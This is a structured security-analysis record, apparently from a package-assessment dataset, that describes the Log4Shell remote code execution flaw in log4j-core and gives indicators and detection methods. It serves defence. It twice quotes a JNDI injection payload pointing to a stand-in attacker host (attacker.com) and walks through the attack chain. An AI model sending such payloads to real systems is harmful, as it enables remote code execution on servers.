package_info.package_versions: 2.14.1 (and other vulnerable versions as per CVE-2021-44228, CVE-2021-45046)
package_info.why_malicious: The affected versions of log4j-core contain a critical remote code execution vulnerability (Log4Shell, CVE-2021-44228) that allows attackers to execute arbitrary code on the server by triggering crafted log messages. This is not a case of intentionally malicious code, but a severe vulnerability that enables malicious exploitation.

malicious_snippets.code_behavior: At runtime, the code processes log messages and, if a message contains a JNDI lookup pattern (e.g., ${jndi:ldap://attacker.com/a}), it performs a JNDI lookup, which can result in loading and executing remote code from an attacker-controlled server.

malice_analysis.why_suspicious: This behavior allows untrusted user input in log messages to trigger network requests and load remote code, which is highly dangerous and enables remote code execution.
malice_analysis.violated_expectations: Normal logging frameworks should not execute code or perform network lookups based on log message content. Here, user-controlled log data can trigger code execution.
malice_analysis.similar_legitimate_use: JNDI lookups are legitimate in controlled, internal environments for service discovery, but not in response to untrusted log data.
key_indicators: Dynamic code execution based on log message content
Unrestricted JNDI lookups from user-controlled input
Network access triggered by log processing

attack_chain.action: Attacker sends a crafted log message containing a JNDI lookup pattern (e.g., ${jndi:ldap://attacker.com/a}) to the vulnerable application.
attack_chain.leads_to: The log message is processed by log4j-core, triggering the JNDI lookup.

attack_chain.action: The vulnerable log4j-core code performs a JNDI lookup to the attacker-controlled server.
attack_chain.leads_to: Remote code or serialized object is loaded and executed, resulting in remote code execution on the server.

behavioral_signatures: JNDI lookups triggered by log message content
Network requests to external LDAP/RMI servers during log processing
file_indicators: JAR/WAR files containing vulnerable log4j-core versions
network_indicators: Outbound LDAP/RMI/HTTP requests to untrusted domains during log processing
detection_knowledge.how_to_detect: Scan Java application artifacts (JARs/WARs) for the presence of vulnerable log4j-core versions and the JndiLookup class. Monitor runtime logs and network activity for JNDI lookup patterns in log messages and unexpected outbound LDAP/RMI/HTTP requests. Use static and dynamic analysis tools to identify code paths where user-controlled input is logged and could trigger JNDI lookups.
